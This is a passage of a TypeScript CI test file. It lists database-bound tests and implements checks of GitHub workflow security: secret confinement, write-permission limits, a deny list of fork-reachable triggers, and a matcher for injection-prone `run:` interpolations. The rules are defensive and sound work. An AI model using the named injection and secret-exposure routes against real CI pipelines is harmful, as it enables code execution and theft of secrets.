	[
		'test/unit/error_taxonomy_tripwire.test.ts',
		'Legs A–C and E are pure tracked-source scans, but leg D needs the suite Postgres and would report an explicit SKIP forever on the hosted tier — putting the whole file there would silently drop the runtime-envelope leg, so it belongs on the DB tier (or needs a split)',
	],
	[
		'test/unit/external_degradation_tripwire.test.ts',
		'The derivation and import-refusal halves read the suite database’s ontology (test TLD nodes) through the postgres-backed resolver, so it needs the live suite DB even though it writes nothing',
	],
	[
		'test/unit/external_egress_tripwire.test.ts',
		'The adapter-shape tests are pure, but the sentinel-control legs resolve the test3 section’s api_config from dd_ontology through the live Postgres before the stubbed fetch ever runs',
	],
	[
		'test/unit/external_isolation_tripwire.test.ts',
		'The behavioural tests run fetchExternalRows against real ontology properties of section test3, so the closure both loads the postgres pool and issues live queries against the suite DB (fetch itself is stubbed, so no network)',
	],
	[
		'test/unit/external_search_target_tripwire.test.ts',
		'The frozen-copy half is credless but the ’real ontology’ describe must resolve the generic test61/test204 callers in the suite database and is deliberately red when it cannot, so the gate as a whole needs postgres',
	],
	[
		'test/unit/external_write_refusal_tripwire.test.ts',
		'It performs real matrix reads and a real scratch-record write/save round trip on the marked suite database — a genuine DB-tier gate that cannot run hosted',
	],
	[
		'test/unit/info_widget_registry_tripwire.test.ts',
		'The ontology-census test queries the shared dd_ontology table for every declared widget_name, so it needs the live matrix Postgres and cannot run on a bare runner',
	],
	[
		'test/unit/matrix_index_asset_policy_agreement.test.ts',
		'By design it creates indexes on and reads pg_get_indexdef from a live Postgres catalog — the signature-not-hand-writable rule cannot be checked without one',
	],
	[
		'test/unit/media_thumb_census_tripwire.test.ts',
		'Its assertions are pure path math and source scans (no query is ever issued — the media root is a marked tmpdir), but the dynamic posterframe.ts import drags the postgres pool module (and its DB config requirements) into the closure, which the hermetic criteria disqualify; splitting posterframeAbsolutePath out of the file_ops chain would make this gate hermetic',
	],
	[
		'test/unit/root_user_hidden_tripwire.test.ts',
		'Half the gate is the exemption direction — proving the direct-fetch paths still resolve the seeded root row from the suite database — so it cannot run without live postgres',
	],
	[
		'test/unit/sql_confinement_tripwire.test.ts',
		'The T1/T3/T4 halves are pure source scans, but the T3 behavioural half writes and queries scratch ontology rows in the live matrix Postgres, so the file as a whole cannot go hermetic without splitting the accessor-semantics tests out',
	],
	[
		'test/unit/temporal_instance_tripwire.test.ts',
		'Drives the real write door against the suite database’s test3 fixture, including a deliberate canary write to a scratch record, so a live Postgres with the suite fixture is required',
	],
	[
		'test/unit/test3_canonical_fixture.test.ts',
		'It restores, resets and snapshots the matrix_test table and matrix_counter in the live suite database — it is the DB fixture’s own gate and is meaningless without Postgres',
	],
	[
		'test/unit/test_db_marker_tripwire.test.ts',
		'The gate’s core proof is behavioural against the live suite database (delete-marker-in-transaction, real refusals, the retired installer bypass refused), so it is DB-bound by design',
	],
	[
		'test/unit/test_rag_db_tripwire.test.ts',
		'Its core proof is behavioural against TWO live databases: the guard is refused on the real suite matrix database (unmarked for the RAG law) and accepted once the real producer marks it inside a rolled-back transaction, and rule 4 asks the RAG POOL ITSELF for `current_database()` and drives a real write door on it — a vector-store guard proved by source alone would be exactly the kind of unverified claim it exists to replace',
	],
	[
		'test/unit/test_media_root_tripwire.test.ts',
		'Most legs are fs/source scans, but the ensureMediaKit refusal door must reach the suite Postgres for the test-database marker check before its media-root refusal fires, so the gate needs the DB tier (or that one door split out)',
	],
	[
		'test/unit/test_tld_ontology_gate.test.ts',
		'Tiers (c)/(d) are declared DATABASE tiers and query/round-trip dd_ontology and matrix tables on the suite DB; only tiers (a)/(b) are hermetic, so the file as a whole cannot go on the hosted tier without being split',
	],
	[
		'test/unit/tm_mode_retired_tripwire.test.ts',
		'Its final test’s dynamic import pulls the postgres pool module into the closure (no query is ever executed — pickReadSource only selects a function — so splitting that one test out or asserting the wiring from source would make the remainder hermetic), but as written the gate reaches the DB layer',
	],
	[
		'test/unit/render_class_native.test.ts',
		'Builds a zz scratch situation (dd_ontology rows + matrix_test records) on the SUITE database and saves through the real saveComponentData, which needs Postgres.',
	],
	[
		'test/unit/tools_cache_invalidation.test.ts',
		'Its reachability and registry-cache tests create, duplicate and delete real records in the suite database to observe cache invalidation end-to-end, so it requires the live matrix Postgres',
	],
	[
		'test/unit/slow_query_scope_native.test.ts',
		'It drives real statements (pg_sleep) on the pool, inside a transaction and on a reserved connection — in-process and in a spawned child carrying DEDALO_SLOW_QUERY_MS — and reads the resulting slow-query log, so it needs a live Postgres.',
	],
	[
		'test/unit/zzscale_corpus_native.test.ts',
		"Every leg builds 1,220 real matrix_test records through the engine's explicit-id write door and reads them back through getChildren / getChildrenRecursive / findInverseReferenceLocators / the ontology resolver and the trigger-derived matrix_string_search and matrix_relation_index tables, so the gate cannot run without a live suite Postgres carrying the dedalo_test_marker.",
	],
	[
		'test/unit/dataframe_contract_tripwire.test.ts',
		"Its normalizer and identity-predicate legs are pure, but the last describe drives the real dataframe doors against the generic test TLD's sections on the suite database — the frame is written and read back, and the deliberate test6100 target exemption is ASSERTED by asking the ontology what selectability contract that section declares — so with the port closed the behavioural half is red.",
	],
	[
		'test/unit/update_engine_atomic_native.test.ts',
		'Every leg runs the real data-update engine in ONE transaction on the suite Postgres maintenance pool (scratch dedalo_ts_test_upd_<pid> tables, advisory try-lock, pg_xact_status, pg_cancel_backend/pg_terminate_backend of its own backends), several in a child process with pinned pool sizes, so it cannot run without a live suite Postgres carrying the dedalo_test_marker.',
	],
	[
		'test/unit/update_descriptor_tripwire.test.ts',
		'Its truth-table half is pure, but every refusal is also asserted as an OUTCOME through updateVersion against the suite Postgres (query-tap count 0, a scratch INSERT that must stay absent), the non-vacuity legs run real steps on the maintenance pool, and the module-load leg loads catalog.ts in a child — with the port closed those legs are red.',
	],
	[
		'test/unit/statement_ceiling_scope_native.test.ts',
		'Its lexer and recorder truth tables are pure, but the pool legs drive real 57014s, acquire timeouts, reserved connections, session-state and transaction-control refusals and a shutdown cancel against the suite Postgres, in child processes with pinned DB_STATEMENT_TIMEOUT_MS / pool sizes — they need a live Postgres.',
	],
	[
		'test/unit/maintenance_door_unbounded_native.test.ts',
		'A child with a 300 ms ceiling holds a real conflicting lock on the suite Postgres and drives the widget door (backfill_search_stores, move_to_table on a zz* scratch section, the detached data-update job) plus a saturated maintenance pool, so the gate needs a live suite Postgres carrying the dedalo_test_marker.',
	],
	[
		'test/unit/optimize_concurrent_leftover_native.test.ts',
		'It builds a scratch table with a deliberately slow index on the suite Postgres, cancels a real REINDEX CONCURRENTLY mid-build and reads pg_index / pg_stat_progress_create_index, so it cannot run without a live Postgres.',
	],
	[
		'test/unit/db_asset_rebuild_atomic_native.test.ts',
		"It rebuilds constraints, triggers and indexes on scratch tables of the suite Postgres while holding a real lock on a blocker table, so its legs drive the maintenance pool's 55P03 lock timeout, a concurrent reader and pg_indexes / pg_constraint / pg_trigger reads, and its control runs the real rebuild_db_constraints / rebuild_db_indexes door; it cannot run without a live suite Postgres carrying the dedalo_test_marker.",
	],
	[
		'test/unit/alias_target_grammar_native.test.ts',
		'It builds its alias situation on the suite Postgres through upsertDdOntologyNode and plants hostile dd_ontology rows inside a sentinel-rolled-back transaction with the six grammar CHECKs dropped, so every leg reads the live resolver against a live dd_ontology; it cannot run without a live suite Postgres.',
	],
	[
		'test/unit/search_alias_sink_native.test.ts',
		'It builds one alias per builder family on matrix_test in the suite Postgres, runs real searches through them, and spawns a child bun that searches the same suite database with the alias module mocked, so both the hostile and the sink legs need a live suite Postgres.',
	],
	[
		'test/unit/dd_ontology_identifier_grammar_native.test.ts',
		'Its truth table is checked against raw INSERTs under the live dd_ontology CHECK constraints and against the write doors with those constraints dropped inside sentinel-rolled-back transactions, and it drives the archive restore plan and the recovery slice, so it cannot run without a live suite Postgres.',
	],
	[
		'test/unit/dd_ontology_grammar_migration_native.test.ts',
		'It executes migration 0013 and the ontology_identifiers reconcile (DELETE, rebuildOntology, ALTER TABLE VALIDATE CONSTRAINT) against planted dd_ontology and matrix_ontology rows inside sentinel-rolled-back transactions, so it cannot run without a live suite Postgres.',
	],
	[
		'test/unit/ontology_state_identifier_grammar_native.test.ts',
		"It seeds ontology source records into matrix_ontology and runs rebuildOntology, which rewrites the scratch tld's dd_ontology rows under the live grammar CHECKs, so it cannot run without a live suite Postgres.",
	],
	[
		'test/unit/diffusion_target_fence_native.test.ts',
		"It holds the publication-target advisory locks from second Postgres sessions, runs the real runner on the suite database's diffusion jobs/dd1758/ledger tables, spawns a runner child on a one- and two-connection pool, and publishes into the lane's suite MariaDB, so it needs a live suite Postgres (and the suite MariaDB the DB tier starts).",
	],
	[
		'test/unit/diffusion_resume_ledger_native.test.ts',
		"It crashes and resumes real publication runs (in-process and a SIGKILLed runner child) on the suite database's diffusion jobs, dd1758 and run-ledger tables, with test triggers planted on them, so it cannot run without a live suite Postgres.",
	],
	[
		'test/unit/diffusion_frontier_replay.test.ts',
		"Its cut-by-cut resume legs resolve the zzdif publication against the suite database's matrix records and replay a run ledger stored in the suite database's ledger table, and its manifest/paging legs read that table through SQL, so it needs a live suite Postgres.",
	],
	[
		'test/unit/diffusion_attach_scope_native.test.ts',
		"It enqueues real diffusion jobs on the suite database's jobs table through diffuseAction and resolves the ACL fixture's principals from matrix_users/matrix_profiles, so it cannot run without a live suite Postgres.",
	],
	[
		'test/unit/media_index_reconcile_fence_native.test.ts',
		'It models a runner batch holding the publication-target advisory lock from a second Postgres session while the media-index reconcile and rebuild doors run, so the exclusion it proves exists only on a live suite Postgres.',
	],
	[
		'test/unit/write_door_native.test.ts',
		'It drives the real declarative tool gate and the write-door primitives as principals minted in matrix_users/matrix_profiles/dd153 projects by authz_door_fixture, against records it builds through the engine, so every leg is a statement about stored grants and rows and cannot run without a live suite Postgres.',
	],
	[
		'test/unit/authz_door_matrix_native.test.ts',
		'Each cell runs a real door (dispatch handler, tool gate, MCP tool, agent door) as a fixture principal resolved from matrix_users/matrix_profiles against engine-built records and asserts the stored effect, so the matrix cannot be evaluated without a live suite Postgres.',
	],
	[
		'test/unit/agent_access_native.test.ts',
		'It logs fixture users into real sessions and drives every dd_mcp_api action through dispatchRqo; the tool grant it tests is a dd1067 locator on a profile row in the suite database, so it cannot run without a live suite Postgres.',
	],
	[
		'test/unit/tool_transcription_gate_native.test.ts',
		"It runs tool_transcription's handlers as fixture principals against engine-built test3 records and measures the stored transcript after a mid-poll revocation saved through the engine's own save door, so it cannot run without a live suite Postgres.",
	],
	[
		'test/unit/identify_vision_grant_native.test.ts',
		"The grant it tests is resolved by getUserTools from the fixture profiles' dd1067 locators in the suite database, and the handlers it drives read engine-built records, so it cannot run without a live suite Postgres.",
	],
	[
		'test/unit/mcp_record_door_native.test.ts',
		"It asserts the section table's row count and its row-id sequence around the MCP delete/duplicate/find_or_create doors, run as fixture principals, so the measure itself is the suite database's stored state.",
	],
	[
		'test/unit/obligation_ledger_native.test.ts',
		'Every case builds the zzot / zzoh observer fixtures on the suite database, drives a real restore, undelete, bulk revert, create, duplicate or delete door, and reads back the stored mirrors, relation_search and Time Machine rows after COMMIT; the ledger it tests drains through the transaction commit lane, which exists only on a live suite Postgres.',
	],
	[
		'test/unit/media_files_info_lost_update_native.test.ts',
		'Its legs are two-connection interleaves on the suite database: a second session holds an uncommitted write on the zzmu row while the update_cache and files_info doors run, and the wait is proven by pg_blocking_pids and a real 55P03 lock timeout, so the lost update it gates cannot be reproduced without a live suite Postgres.',
	],
	[
		'test/unit/duplicate_record_media_verdict_native.test.ts',
		"It duplicates zzdm records it creates on the suite database (with the section's own counter, so the clone's id is known in advance) and reads back the clone's stored and Time Machine file_path values beside the files copied under the lane's marked media root, so every case needs the suite Postgres.",
	],
	[
		'test/unit/portal_locator_door_native.test.ts',
		'It mints scratch projects, profiles and users through the counter on the suite database, creates the host records it unlinks from, and measures every refusal on the stored portal and slot bytes and the Time Machine row count, so it cannot run without a live suite Postgres.',
	],
	[
		'test/unit/ai_spend_budget_native.test.ts',
		"It materializes the engine ontology into the suite database's dd_ontology, reserves and settles against the shipped ledger section's rows (concurrent reservations racing on its row locks) and drives the metered doors as fixture users resolved from the suite database, so it cannot run without a live suite Postgres.",
	],
	[
		'test/unit/engine_ontology_retired_native.test.ts',
		"It plants a retired engine node's source record, dd_ontology row and registry value in the suite database and runs the engine-ontology door to prune them (a scratch ontology35 registry row minted by createMainSection), so it cannot run without a live suite Postgres.",
	],
	[
		'test/unit/ontology_registry_row_native.test.ts',
		"It mints scratch ontology35 registry rows through the engine's registry doors on the suite database, runs the import and rebuild doors over them (and over the suite's real lg row, snapshotted and restored) and reads every column back, so it cannot run without a live suite Postgres.",
	],
	[
		'test/unit/ontology_dependencies_native.test.ts',
		"It writes scratch ontology35 registry rows and their stored hierarchy60 declarations on the suite database, then reads them back through the census, the manifest builder and the update's missing-dependency report, so it cannot run without a live suite Postgres.",
	],
	[
		'test/unit/install_hierarchy_dependencies_native.test.ts',
		"It writes scratch ontology35 registry rows declaring thesauri on the suite database and reads them back through the wizard's install_hierarchies reader, so it cannot run without a live suite Postgres.",
	],
	[
		'test/unit/change_plan_write_door_native.test.ts',
		"It installs the authz door fixture's scratch projects, profiles and users on the suite database, creates the record its plans address, and validates every plan through the write door's real permission and scope resolution, so it cannot run without a live suite Postgres.",
	],
	[
		'test/unit/import_create_door_native.test.ts',
		"It installs the authz door fixture's scratch projects, profiles and users on the suite database, runs the mapped and CSV importers as those users so they create (or are refused) real test3 records, and measures every refusal on the stored rows and the section's row count, so it cannot run without a live suite Postgres.",
	],
	[
		'test/unit/install_ontology_door_native.test.ts',
		"It drives the installer's ontology door (stage + import through the update panel's shared lower layer) against the suite Postgres, serving its zz packages from a loopback ontology-master stand-in, and measures dd_ontology / matrix_ontology / registry / matrix_dd rows and their census around every case, so it cannot run without a live suite Postgres.",
	],
]);

/**
 * Rule 7d's matcher: the `line  text` of every run: script line that interpolates an
 * input, `github.event.*`, a secret, or a job/step output. A run: script is the
 * `run:` line (bare or list-item `- run:`) and its block, until the next step key.
 */
function runInterpolations(src: string): string[] {
	const hits: string[] = [];
	let inRun = false;
	// The column of the `run` key: its script is every following line indented DEEPER. A
	// line at or left of it (a sibling key, the next `- name:`, the next JOB) ends it —
	// the key-name list alone let a run block run on into the next job's `outputs:`.
	let runColumn = -1;
	for (const [index, raw] of src.split('\n').entries()) {
		const indent = raw.length - raw.trimStart().length;
		if (/^\s*(?:-\s+)?run:\s*[|>]?[-+]?\s*$/.test(raw) || /^\s*(?:-\s+)?run:\s+\S/.test(raw)) {
			inRun = true;
			runColumn = raw.indexOf('run:');
		} else if (
			/^\s*-?\s*(?:name|uses|with|env|if|id|shell|working-directory):/.test(raw) ||
			(inRun && raw.trim() !== '' && indent <= runColumn)
		) {
			inRun = false;
		}
		if (!inRun) continue;
		if (
			/\$\{\{\s*(?:inputs|github\.event|secrets)\./.test(raw) ||
			/\$\{\{\s*(?:needs\.[\w-]+|steps\.[\w-]+)\.outputs\b/.test(raw)
		) {
			hits.push(`${index + 1}  ${raw.trim().slice(0, 90)}`);
		}
	}
	return hits;
}

/** A workflow's `jobs:` section split into `id → block` (2-space job keys). */
function jobBlocks(src: string): Map<string, string> {
	const blocks = new Map<string, string>();
	const at = src.search(/^jobs:/m);
	if (at === -1) return blocks;
	for (const block of src
		.slice(at)
		.split(/\n(?= {2}[A-Za-z0-9_-]+:\s*$)/m)
		.slice(1)) {
		const id = block.match(/^\s*([A-Za-z0-9_-]+):/)?.[1];
		if (id !== undefined) blocks.set(id, block);
	}
	return blocks;
}

/** The trigger names of a workflow's `on:` block (block form: 2-space keys). */
function triggerNames(src: string): string[] {
	const lines = src.split('\n');
	const at = lines.findIndex((l) => /^on:/.test(l));
	if (at === -1) return [];
	const names: string[] = [];
	for (let i = at + 1; i < lines.length; i++) {
		const line = lines[i] as string;
		if (line.trim() === '' || line.trim().startsWith('#')) continue;
		if (/^\S/.test(line)) break;
		const m = line.match(/^ {2}([A-Za-z_]+):/);
		if (m) names.push(m[1] as string);
	}
	return names;
}

/** The ONE workflow that may reference a secret, and the environment that must guard it (rule 11). */
const SECRET_WORKFLOW = 'image-release.yml';
const SECRET_ENVIRONMENT = 'image-release';
/** Triggers that hand fork or unattended code to a job — none may fire the secret-holding workflow. */
const SECRET_FORBIDDEN_TRIGGERS = [
	'pull_request',
	'pull_request_target',
	'workflow_run',
	'schedule',
];

/** Every secret EXPRESSION in a text: its name, or `?` when the expression is not a plain name. */
function secretReferences(src: string): string[] {
	return [...src.matchAll(/\$\{\{([\s\S]*?)\}\}/g)]
		.filter((m) => /\bsecrets\b/.test(m[1] as string))
		.map((m) => (m[1] as string).match(/^\s*secrets\.([A-Za-z0-9_]+)\s*$/)?.[1] ?? '?');
}

/** Does a job block declare the protected environment (scalar or `name:` mapping form)? */
function declaresSecretEnvironment(block: string): boolean {
	return (
		new RegExp(`^ {4}environment:\\s*${SECRET_ENVIRONMENT}\\s*$`, 'm').test(block) ||
		new RegExp(`^ {4}environment:\\s*\\n {6}name:\\s*${SECRET_ENVIRONMENT}\\s*$`, 'm').test(block)
	);
}

/**
 * Rule 11's judge, PURE: the faults of one workflow file's secret references. Outside
 * SECRET_WORKFLOW every reference is a fault; inside it, a reference outside the
 * environment-bound job, a name the registry list does not declare, and a forbidden
 * trigger on the file are faults.
 */
function secretReferenceFaults(file: string, src: string, declared: readonly string[]): string[] {
	if (file !== SECRET_WORKFLOW)
		return secretReferences(src).map((name) => `${file}: references secret '${name}'`);
	const faults = SECRET_FORBIDDEN_TRIGGERS.filter((trigger) =>
		triggerNames(src).includes(trigger),
	).map((trigger) => `${file}: holds secrets AND is triggered by \`${trigger}\``);
	const header = src.slice(0, Math.max(0, src.search(/^jobs:/m)));
	for (const name of secretReferences(header))
		faults.push(`${file}: secret '${name}' outside any job`);
	for (const [id, block] of jobBlocks(src)) {
		const names = secretReferences(block);
		if (names.length > 0 && !declaresSecretEnvironment(block))
			faults.push(
				`${file} job '${id}': references ${names.join(', ')} without \`environment: ${SECRET_ENVIRONMENT}\``,
			);
		for (const name of names.filter((n) => !declared.includes(n)))
			faults.push(
				`${file} job '${id}': secret '${name}' is not declared by engineering/image_registries.json`,
			);
	}
	return faults;
}

/**
 * Rule 17's judge, PURE over the two texts it binds, so the controls can hand it
 * mutated copies of the real files and watch each fault appear.
 *
 * The push gate (hermetic.sh) is allowed to defer the TIME-BASED checks — the
 * dependency-audit stage runs `--changed-since <base>` and the vendor tripwire's
 * calendar legs are dropped by DEDALO_VENDOR_DATED_CHECKS=0 — ONLY because
 * .github/workflows/nightly.yml runs them unconditionally. So a deferral without
 * that home is red, and so is a home that cannot fail, cannot report, or hands a
 * write token to code it runs.
 */
function nightlyFaults(nightly: string | null, hermetic: string): string[] {
	const faults: string[] = [];
	const hermeticCode = hermetic
		.split('\n')
		.map((l) => l.trim())
		.filter((l) => l !== '' && !l.startsWith('#'));
	const auditStage = hermeticCode.find((l) => /^bun run scripts\/ci\/audit\.ts\b/.test(l));
	const defersAudit = auditStage?.includes('--changed-since') === true;
	const dropsDated = hermeticCode.some((l) => /^export DEDALO_VENDOR_DATED_CHECKS=/.test(l));
	if (auditStage === undefined)
		faults.push(
			'hermetic.sh runs no `bun run scripts/ci/audit.ts` stage — the ratchet runs on no push',
		);
	if (dropsDated && !hermeticCode.includes('export DEDALO_VENDOR_DATED_CHECKS=0'))
		faults.push('hermetic.sh sets DEDALO_VENDOR_DATED_CHECKS to something other than 0');
	if (!defersAudit && !dropsDated) return faults; // nothing deferred, nothing owed
	if (nightly === null) {
		faults.push(
			'hermetic.sh defers the time-based checks (--changed-since / DEDALO_VENDOR_DATED_CHECKS=0) but .github/workflows/nightly.yml does not exist — they run NOWHERE',
		);
		return faults;
	}

	// (a) triggers: a schedule and a manual dispatch; never a push or PR event.
	const triggers = triggerNames(nightly);
	if (
		!triggers.includes('schedule') ||
		!/^\s*-\s*cron:\s*["']?[^"'\s][^"']*["']?\s*$/m.test(nightly)
	)
		faults.push(
			'nightly.yml: no `schedule` with a cron — the time-based checks never run by themselves',
		);
	if (!triggers.includes('workflow_dispatch'))
		faults.push(
			'nightly.yml: no `workflow_dispatch` — the issue path cannot be rehearsed on demand',
		);
	for (const banned of ['push', 'pull_request', 'pull_request_target', 'workflow_run'])
		if (triggers.includes(banned))
			faults.push(
				`nightly.yml: triggered by \`${banned}\` — its report job holds issues: write, which fork or push code must never reach, and a push trigger would make it a push gate again`,
			);

	// (b) top-level token: read-only.
	const top = nightly.match(/^permissions:([^\n]*)((?:\n[ \t]+[^\n]*)*)/m);
	if (top === null) faults.push('nightly.yml: no top-level permissions block');
	else if (/write/.test(`${top[1]}${top[2]}`))
		faults.push(
			'nightly.yml: the TOP-LEVEL permissions grant a write scope — widen only the report job',
		);

	const jobs = jobBlocks(nightly);
	const codeOf = (block: string) =>
		block
			.split('\n')
			.map((l) => l.trim())
			.filter((l) => l !== '' && !l.startsWith('#'));

	// (c) exactly one job widens, only to issues: write, and it runs no repository code.
	const writers = [...jobs].filter(
		([, block]) => /^\s{4}permissions:/m.test(block) && /:\s*write\b/.test(block),
	);
	if (writers.length !== 1)
		faults.push(
			`nightly.yml: ${writers.length} jobs declare a write scope — exactly one (the report) may`,
		);
	for (const [id, block] of writers) {
		const scopes = [...block.matchAll(/^\s{6}([a-z-]+):\s*(read|write|none)\s*$/gm)].map(
			(m) => `${m[1]}: ${m[2]}`,
		);
		const writes = scopes.filter((scope) => scope.endsWith('write'));
		if (writes.join() !== 'issues: write')
			faults.push(
				`nightly.yml job '${id}': writes ${writes.join(', ') || 'nothing'} — only issues: write is needed`,
			);
		const code = codeOf(block);
		if (code.some((l) => /uses:\s*actions\/checkout@/.test(l)))
			faults.push(`nightly.yml job '${id}': holds a write token AND checks out the repository`);
		if (
			code.some((l) => /^(?:[A-Z0-9_]+=\S*\s+)*(?:bun|bunx|node|npm|npx)\b|^bash scripts\//.test(l))
		)
			faults.push(`nightly.yml job '${id}': holds a write token AND runs repository code`);
		if (!code.some((l) => /^if:\s*(?:\$\{\{\s*)?always\(\)/.test(l)))
			faults.push(
				`nightly.yml job '${id}': not \`if: always()\` — a red check skips it, and the red night files no issue`,
			);
	}

	// (d) the audit runs forced, network-required, summarised — and its verdict is the run's.
	const auditJob = [...jobs].find(([, block]) =>
		codeOf(block).some((l) => /^bun run scripts\/ci\/audit\.ts\b/.test(l)),
	);
	if (auditJob === undefined) {
		faults.push('nightly.yml: no job runs `bun run scripts/ci/audit.ts`');
		return faults;
	}
	const [auditJobId, auditBlock] = auditJob;
	const auditCode = codeOf(auditBlock);
	const invocation = auditCode.find((l) => /^bun run scripts\/ci\/audit\.ts\b/.test(l)) as string;
	for (const flag of ['--force', '--require-network', '--summary'])
		if (!invocation.includes(flag))
			faults.push(`nightly.yml: the audit invocation lacks ${flag} — \`${invocation}\``);
	if (invocation.includes('--changed-since'))
		faults.push(
			'nightly.yml: the audit invocation passes --changed-since — the nightly would skip too',
		);
	if (auditCode.some((l) => /^(?:-\s+)?continue-on-error:/.test(l)))
		faults.push(
			`nightly.yml job '${auditJobId}': continue-on-error — a red audit would be a green run`,
		);
	if (/\|\|/.test(invocation)) {
		// Captured, so it must be CARRIED: written to the step's outputs and exited with.
		const captured = invocation.match(/\|\|\s*([A-Za-z_]+)=\$\?\s*$/)?.[1];
		const stepId = auditBlock
			.split(/\n(?= {6}- )/)
			.find((step) => step.includes('bun run scripts/ci/audit.ts'))
			?.match(/^\s*id:\s*([\w-]+)\s*$/m)?.[1];
		// Three links, each observable: the step writes `<v>=$<v>` to its outputs, some
		// env key binds `steps.<id>.outputs.<v>`, and a later step's whole payload is
		// `exit "$<that key>"`.
		const text = auditCode.join('\n');
		const envKey =
			captured === undefined || stepId === undefined
				? undefined
				: text.match(
						new RegExp(
							`^([A-Z_]+):\\s*\\$\\{\\{\\s*steps\\.${stepId}\\.outputs\\.${captured}\\s*\\}\\}$`,
							'm',
						),
					)?.[1];
		const carried =
			captured !== undefined &&
			envKey !== undefined &&
			auditCode.some((l) => l.includes(`${captured}=$${captured}`)) &&
			auditCode.some((l) => new RegExp(`^(?:-\\s+)?run:\\s*exit "?\\$${envKey}"?$`).test(l));
		if (!carried)
			faults.push(
				`nightly.yml job '${auditJobId}': the audit's status is captured (\`${invocation}\`) but never carried to an \`exit\` — a red audit would be a green run`,
			);
	}
	return faults;
}

describe('CI workflow tripwire', () => {
	test('every GitHub workflow using setup-bun pins via bun-version-file, never inline', () => {
		for (const { rel, src } of allWorkflows) {
			if (!src.includes('setup-bun')) continue;
			expect(src, `${rel}: setup-bun must use bun-version-file: .bun-version`).toContain(
				'bun-version-file: .bun-version',
			);
			expect(src, `${rel}: inline bun-version would drift from the .bun-version pin`).not.toMatch(
				/bun-version:\s/,
			);
		}
	});

	// Rule 5 — the public-repo security posture, mechanically.
	test('NO self-hosted job lives in .github/workflows/ (public repo — fork PRs would get RCE on the data host)', () => {
		const offenders = workflowFiles.filter((f) =>
			targetsSelfHosted(read(join('.github', 'workflows', f))),
		);
		expect(
			offenders,
			'dedalia-org/dedalo is PUBLIC. A `runs-on: self-hosted` job here executes fork-PR code on the Mac that holds ../private/.env and the live matrix Postgres. Move it to .github/workflows-selfhosted/ (inert; GitHub executes only .github/workflows/). If the repo ever goes private again, retire this rule deliberately — do not just delete it:',
		).toEqual([]);
	});

	/**
	 * Rule 6 — hermetic.sh stubs EVERY required-no-default config key.
	 *
	 * The bug this exists to prevent (2026-07-11, the first real CI run): hermetic.sh
	 * stubbed 5 of the 8 required keys. On a developer machine the missing three were
	 * silently satisfied by ../private/.env, so the script passed locally and died on
	 * the bare runner with `Missing required config key 'PROJECTS_DEFAULT_LANGS'`. A
	 * hermetic script that reads a file it swears it does not read is not hermetic —
	 * and only CI could tell us. Now the stub list cannot drift from the catalog.
	 */
	test('every hosted tier script stubs every required-no-default config key (following its source lines)', () => {
		const required = new Set(
			Object.entries(CONFIG_CATALOG)
				.filter(([, entry]) => entry.required === true)
				.map(([key]) => key),
		);
		expect(
			required.size,
			'no required config keys in the catalog — src/config/catalog/ moved or lost its `required` flags',
		).toBeGreaterThan(0);

		// Control for the source-following: the db tier's stubs live in the file it
		// sources, so a reader that does not follow `source` sees none of them.
		expect(
			/^\s*: "\$\{DB_HOST:=/m.test(read('scripts/ci/db_tier.sh')),
			'db_tier.sh assigns DB_HOST inline again — the composition moved to hosted_env.sh; keep one copy',
		).toBe(false);
		expect(/^\s*: "\$\{DB_HOST:=/m.test(effectiveSource('scripts/ci/db_tier.sh'))).toBe(true);

		const scripts = hostedTierScripts();
		expect(scripts.length).toBeGreaterThanOrEqual(3);
		for (const script of scripts) {
			const src = effectiveSource(script);
			// A key counts as stubbed iff it is ASSIGNED and EXPORTED. The old grammar
			// (`${KEY:[=-]`) credited any `${KEY:-fallback}` READ anywhere in the file:
			// the DEDALO_APPLICATION_LANGS if-block passed only through its guard's
			// `[ -z "${…:-}" ]`, while the assignment and the export were invisible to
			// it. So deleting that block while any diagnostic `${KEY:-}` read survived
			// would have kept this gate green and killed the bare runner at module
			// init — the exact 2026-07-11 class this rule exists to prevent.
			//
			// Two assignment forms are accepted (`: "${KEY:=…}"` and a line-start
			// `KEY=…`, which is the if-block body), and the key must additionally
			// reach an `export` line: the catalog reads process.env, and an
			// unexported shell variable never gets there.
			const assigned = new Set(
				[
					...src.matchAll(/^\s*: "\$\{([A-Z0-9_]+):=/gm),
					...src.matchAll(/^\s*([A-Z0-9_]+)=/gm),
				].map((m) => m[1] as string),
			);
			const exported = new Set(
				[...src.matchAll(/^\s*export\s+(.+)$/gm)].flatMap((m) =>
					(m[1] as string).split(/\s+/).map((token) => token.split('=')[0] as string),
				),
			);
			const unstubbed = [...required]
				.filter((key) => !(assigned.has(key) && exported.has(key)))
				.sort();
			expect(
				unstubbed,
				`Required config keys not assigned-and-exported in ${script} (or the scripts it sources). On a bare CI runner there is no ../private/.env, so the config catalog THROWS at module init and the whole tier dies (with cascading "Cannot access 'config' before initialization" TDZ noise). Add a harmless stub — it only has to parse — and put the key on an export line:`,
			).toEqual([]);
		}
	});

	// The self-hosted tier must stay IN THE REPO. Gitignoring it would (a) never reach
	// the private mirror, which is a push of this repo, and (b) make the pin/oracle
	// rules above pass vacuously over an empty list. It carries no secrets — only
	// `${{ secrets.X }}` names — so there is nothing to hide, and hiding it would only
	// remove it from review.
	test('the self-hosted tier is version-controlled and non-empty (never gitignored)', () => {
		expect(
			selfHostedFiles.length,
			'.github/workflows-selfhosted/ has no workflow YAML. It is the parked DB/parity/client tier — if it was deleted or gitignored, restore it: the private mirror receives it by PUSH, and this gate guards its bun pin + ORACLE_REQUIRED wiring.',
		).toBeGreaterThan(0);
		const stray = selfHostedFiles.filter(
			(f) => !targetsSelfHosted(read(join('.github', 'workflows-selfhosted', f))),
		);
		expect(
			stray,
			'Workflow in .github/workflows-selfhosted/ that targets no self-hosted runner — if it can run hosted, it belongs in .github/workflows/ where it will actually execute:',
		).toEqual([]);
	});

	// Rule 7 — least privilege. Binds to BOTH tiers: the self-hosted jobs are the ones
	// with real reach (they run on the data host), so an inherited write token there is
	// worse, not better.
	test('every workflow declares a top-level permissions block', () => {
		const offenders = allWorkflows
			.filter(({ src }) => !/^permissions:/m.test(src))
			.map(({ rel }) => rel);
		expect(
			offenders,
			'A workflow with no top-level `permissions:` inherits the REPOSITORY default GITHUB_TOKEN scope — historically read/write on contents, i.e. push rights handed to every step of a job that only reads. Declare what the job actually needs (`permissions: {contents: read}` for all of ours except codeql.yml, which writes code-scanning alerts):',
		).toEqual([]);
	});

	// Rule 7b — the VALUE, not the presence (P2-21 / GATE-45). The rule above is
	// `!/^permissions:/m`, which is satisfied by `permissions: write-all` — the
